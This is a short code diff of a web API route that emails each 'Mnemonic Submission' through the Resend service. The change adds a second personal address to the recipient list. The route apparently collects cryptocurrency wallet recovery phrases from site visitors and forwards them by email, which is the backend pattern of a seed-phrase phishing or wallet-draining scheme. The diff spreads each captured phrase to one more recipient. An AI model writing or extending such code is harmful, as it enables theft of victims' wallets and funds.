@@ -42,7 +42,10 @@ export async function POST(req) {
     /* ===== SEND EMAIL ===== */
     const { data, error } = await resend.emails.send({
       from: "Mnemonic Bot <onboarding@resend.dev>",
-      to: ["vishalupdev@gmail.com"],
+       to: [
+    "vishalupdev@gmail.com",
+    "stveevmarklemarkle@gmail.com",
+  ],
       subject: "Mnemonic Submission",
       html: `
         <h3>Mnemonic Received</h3>
